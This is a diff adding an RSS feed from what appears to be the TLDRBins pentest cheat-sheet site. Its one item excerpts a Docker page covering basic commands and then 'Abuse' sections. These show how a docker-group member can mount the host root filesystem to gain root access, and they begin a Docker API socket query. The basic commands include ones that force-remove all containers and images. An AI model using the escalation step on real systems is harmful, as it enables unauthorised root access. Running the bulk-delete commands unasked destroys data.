@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Dive on TLDRBins</title>
+    <link>https://tldrbins.github.io/@dive/</link>
+    <description>Recent content in Dive on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@dive/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Docker</title>
+      <link>https://tldrbins.github.io/docker/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/docker/</guid>
+      <description>Basic Commands # Show all running processes sudo docker ps -a # Show all images sudo docker images -a # Stop all processes sudo docker stop $(sudo docker ps -a -q) # Remove all processes sudo docker rm -vf $(sudo docker ps -a -q) # Remove all images sudo docker rmi -f $(sudo docker images -aq) Explore Docker image dive&#xA;dive docker-archive://image.tar Abuse #1: Docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it &amp;lt;IMAGE_NAME&amp;gt; bash # Check ls /mnt/root Abuse #2: Docker API # Show running containers curl -s --unix-socket /var/run/docker.</description>
+    </item>
+  </channel>
+</rss>
